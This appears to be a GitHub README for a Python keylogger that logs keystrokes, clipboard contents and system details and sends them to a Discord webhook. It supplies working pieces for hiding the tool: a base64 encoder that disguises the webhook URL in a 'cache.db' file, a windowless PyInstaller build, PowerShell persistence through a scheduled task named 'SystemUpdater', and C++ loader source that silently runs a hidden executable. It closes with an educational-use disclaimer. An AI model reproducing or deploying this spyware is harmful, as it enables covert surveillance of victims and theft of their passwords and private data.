# 🛡️ Keylogger

A fully featured keylogger written in Python. It captures keystrokes, clipboard changes, and system information, and sends the data securely to a hidden Discord webhook.

---

## ⚙️ Features

* ⌨️ Logs all keystrokes with modifier support (e.g., `CTRL + C`)
* 📋 Detects clipboard changes and sends content in real time
* 💻 Collects system information (hostname, user, IPs, OS)
* ⏱️ Sends data periodically to a webhook in minute intervals
* 🔒 Uses a disguised log file to hide the webhook URL
* ❌ Automatically exits if no valid webhook is found
* 🫌 Compatible with both development and compiled environments

---

## 🔧 Compilation Instructions

To compile the script into a standalone executable using **PyInstaller**:

```bash
pyinstaller --onefile --noconsole --icon="icon_path.ico" Keylogger_Code.py
```

Replace `icon_path.ico` with your actual icon file path.
The `--noconsole` flag ensures no command window pops up when running.

---

## 🔐 Webhook Handling

To protect the Discord webhook URL from being exposed in the source code, use the included `Base64_webhook_encoder.py`. This script asks for a webhook, base64-encodes it, and writes it to a file called `cache.db`.

### Encoder Example (Base64\_webhook\_encoder.py)

```python
import base64
import os
import sys
import msvcrt

webhook = input("Enter your Discord webhook URL: ").strip()
if not webhook.startswith("http"):
    print("❌ Invalid webhook URL!")
    print("Press any key to exit...")
    msvcrt.getch()
    sys.exit(1)

encoded = base64.b64encode(webhook.encode()).decode()
base_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
full_path = os.path.join(base_dir, "cache.db")

try:
    with open(full_path, "w", encoding="utf-8") as f:
        f.write(encoded)
    print(f"✅ Webhook saved to: {full_path}")
except Exception as e:
    print(f"❌ Failed to save: {e}")

print("Done. Press any key to close...")
msvcrt.getch()
```

---

## 📁 Project Structure

| File                        | Description                                                        |
| --------------------------- | ------------------------------------------------------------------ |
| `Base64_webhook_encoder.py` | CLI tool to encode and save a webhook in `cache.db`                |
| `Keylogger_Code.py`         | Main keylogger implementation (keyboard + clipboard + system info) |
| `startloader.cpp`           | C++ DLL loader that executes the compiled keylogger binary         |
| `LICENSE`                   | MIT license declaration                                            |
| `README.md`                 | Documentation and instructions                                     |

---

## 🚨 Autostart (DLL via Task Scheduler)

This config uses a scheduled task to execute the keylogger DLL upon user logon.

### ▶ Autostart the DLL

```powershell
$Action = New-ScheduledTaskAction -Execute "rundll32.exe" -Argument '"C:\ProgramData\Microsoft\CacheSync\update.dll",MyFunction'
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Limited
Register-ScheduledTask -TaskName "SystemUpdater" -Action $Action -Trigger $Trigger -Principal $Principal
```

### ❌ Remove the DLL Autostart

```powershell
Unregister-ScheduledTask -TaskName "SystemUpdater" -Confirm:$false
```

---

## ⚒️ startloader.dll Compilation

The `startloader.cpp` file contains the following code:

```cpp
#include <windows.h>

extern "C" __declspec(dllexport) void CALLBACK MyFunction(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    WinExec("C:\\ProgramData\\Microsoft\\CacheSync\\systemupdater.exe", SW_HIDE);
}
```

### ▶ Compile Command

```bash
g++ -shared -o startloader.dll startloader.cpp -Wl,--add-stdcall-alias
```

This creates a `.dll` that calls a hidden executable. The function name `MyFunction` is important for `rundll32.exe` to reference during scheduled task execution.

---

## 📢 Download

The latest compiled release (EXE/DLL) is available here:
**[Latest Release →](https://github.com/mrpanda-bamboo/keylogger/releases/latest)**

---

## 📜 License

This project is released under the **MIT License**.
See the [LICENSE](./LICENSE) file for more information.

---

## 🚨 Disclaimer

> This software is intended for **educational, research, and ethical testing purposes only**.
> **Do not** use this tool on systems you do not own or have explicit permission to monitor.
> Misuse of this software can violate privacy laws and may be considered illegal in many countries.
> The author takes no responsibility for misuse or damage caused.
